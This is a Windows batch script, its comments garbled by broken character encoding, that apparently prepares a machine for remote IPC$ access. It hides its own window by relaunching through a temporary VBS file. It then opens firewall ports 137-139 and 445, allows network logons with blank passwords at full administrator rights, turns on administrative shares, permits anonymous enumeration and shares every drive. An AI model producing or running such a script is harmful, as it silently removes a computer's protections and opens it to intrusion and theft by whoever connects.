::-------------------------------------------------------------
::IPC$����ǰ��׼������      O(��_��)O����~
::-------------------------------------------------------------

::����:
::����server����
::��ӷ���ǽ����
::ȥ��Զ�̵�¼����ԱȨ������
::ȥ������������

::-------------------------------------------------------------
::����cmd����
@echo oFF 
if "%1" neq "1" (
>"%temp%\tmp.vbs" echo set WshShell = WScript.CreateObject^(^"WScript.Shell^"^) 
>>"%temp%\tmp.vbs" echo WshShell.Run chr^(34^) ^& %0 ^& chr^(34^) ^& ^" 1^",0 
start /d "%temp%" tmp.vbs 
exit 
) 

::-------------------------------------------------------------


::����server����
net start server /yes
net start lanmanserver /yes

::��ӷ���ǽ����
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 137:udP /t reg_sz /d 137:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 138:udP /t reg_sz /d 138:UDP:LocalSubNet:Enabled:@xpsp2res.dll,-22002 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 139:TCP /t reg_sz /d 139:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22004 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 445:TCP /t reg_sz /d 445:TCP:LocalSubNet:Enabled:@xpsp2res.dll,-22005 /f

::ȥ��Զ�̵�¼����ԱȨ������
::ȥ������������
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t reg_dword /d 00000000 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v limitblankpassworduse /t reg_dword /d 00000000 /f

::����Ĭ�Ϲ���
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareWks /t reg_dword /d 00000001 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters" /v AutoShareServer /t reg_dword /d 00000001 /f

::ȥ��ö������
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t reg_dword /d 00000000 /f

::���ù���
for %%a in (c d e f g h i j k l m n) do @(
if exist %%a: (
net share %%a$=%%a:
)
)
net share admin$

